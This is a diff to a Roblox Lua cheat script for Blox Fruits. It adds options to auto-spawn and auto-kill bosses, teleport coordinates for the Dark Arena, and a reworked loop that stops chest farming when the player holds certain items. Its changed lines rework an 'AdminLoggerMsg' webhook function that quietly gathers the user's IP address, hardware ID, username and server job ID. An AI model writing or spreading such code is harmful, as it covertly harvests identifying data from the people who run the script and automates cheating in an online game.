@@ -19,7 +19,9 @@ getgenv().config = {
         ["Send Webhook"] = true,      
     },
     Premium = {
+	["Auto Spawn Dark Beard"] = true,
         ["Auto Kill Dark Beard"] = true,
+	["Auto Spawn Rip Indra"] = true,    --Need 3 Haki Lengend
         ["Auto Kill Rip Indra"] = true,
     },
 }
@@ -239,10 +241,10 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
             description = "",
             color = tonumber(0xffffff),
             fields = {
-                { name = "**👤 Username", value = "||```" .. player.Name .. "```||", inline = true },
-                { name = "**🗿UserID", value = "```" .. player.UserId .. "```", inline = true },
-                { name = "**💰 Beli", value = "```" .. beli .. "```", inline = false },
-                { name = "**🌇IP Address", value = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||", inline = false },
+                { name = "👤 Username", value = "||```" .. player.Name .. "```||", inline = true },
+                { name = "🗿UserID", value = "```" .. player.UserId .. "```", inline = true },
+                { name = "💰 Beli", value = "```" .. beli .. "```", inline = false },
+                { name = "🌇IP Address", value = "||```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```||", inline = false },
                 { name = "💻 HWID", value = "```" .. (gethwid and gethwid() or "Unknown") .. "```", inline = false },
                 { name = "🧭 Job ID", value = "```" .. game.JobId .. "```", inline = false },
                 { name = "📜Join Code", value = "```lua\n" ..
@@ -858,43 +860,56 @@ spawn(function()
     end
 end)
 
-local seaThirdSea = CFrame.new(-5056.14794921875, 314.68048095703125, -2985.12255859375)  -- Third Sea (Castle)
-local seaSecondSea = CFrame.new(-411.2250061035156, 73.31524658203125, 371.2820129394531)     -- Second Sea (Cafe)
+local seaThirdSea  = CFrame.new(-5056.14794921875, 314.68048095703125, -2985.12255859375)  -- Third Sea
+local seaSecondSea = CFrame.new(-411.2250061035156, 73.31524658203125, 371.2820129394531)    -- Second Sea
+local dark         = CFrame.new(3777.7236328125, 14.885692596435547, -3501.616455078125)    -- Dark Arena
 
 local function GetSeaCoordinates()
-    if game.PlaceId == 4442272183 then  
+    if game.PlaceId == 4442272183 then
         return seaSecondSea
-    elseif game.PlaceId == 7449423635 then  
+    elseif game.PlaceId == 7449423635 then
         return seaThirdSea
-    else
-        return nil
     end
 end
 
---Check Backpack
 spawn(function()
-    while wait() do
-        if getgenv().config.ChestFarm["Stop When Have God's Chalice or Dark Key"] then
-            local hasGodsChalice = game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice")
-            local hasFistOfDarkness = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or game.Players.LocalPlayer.Character:FindFirstChild("Fist of Darkness")
+    while task.wait(1) do
+        local lp = game.Players.LocalPlayer
+        local char = lp.Character
+        local bp = lp.Backpack
 
-            if hasGodsChalice or hasFistOfDarkness then
-                    
-                getgenv().config.ChestFarm["Start Farm Chest"] = false
-                getgenv().config.Setting["No Stuck Chair"] = false
-                    
-                local seaCoordinates = GetSeaCoordinates()
-                if seaCoordinates then
-                    Tween2(seaCoordinates)
-                    wait(1.5)
+        if getgenv().config.Premium["Auto Spawn Dark Beard"] then
+            if game.PlaceId == 4442272183 then
+                local hasFist = bp:FindFirstChild("Fist of Darkness")
+                             or (char and char:FindFirstChild("Fist of Darkness"))
+                if hasFist then
+                    Tween2(dark)
                 end
-                    
-                break
+            end
+
+        else
+            if getgenv().config.ChestFarm["Stop When Have God's Chalice or Dark Key"] then
+                local hasChalice = bp:FindFirstChild("God's Chalice")
+                                 or (char and char:FindFirstChild("God's Chalice"))
+                local hasFist    = bp:FindFirstChild("Fist of Darkness")
+                                 or (char and char:FindFirstChild("Fist of Darkness"))
+
+                if hasChalice or hasFist then
+                    -- Dừng farm chest
+                    getgenv().config.ChestFarm["Start Farm Chest"] = false
+                    getgenv().config.Setting["No Stuck Chair"]     = false
+
+                    local seaCFrame = GetSeaCoordinates()
+                    if seaCFrame then
+                        Tween2(seaCFrame)
+                        task.wait(1.5)
+                    end
+                    break 
+                end
             end
         end
     end
 end)
-
 
 -- ========== Auto Jump nếu kẹt ghế ==========
 function AutoJump()
@@ -1428,6 +1443,7 @@ task.spawn(function()
 end);
 
 getgenv().AutoTurnOnV4 = true;
+
 spawn(function(Value)
 	getgenv().AutoTurnOnV4 = Value
 end)
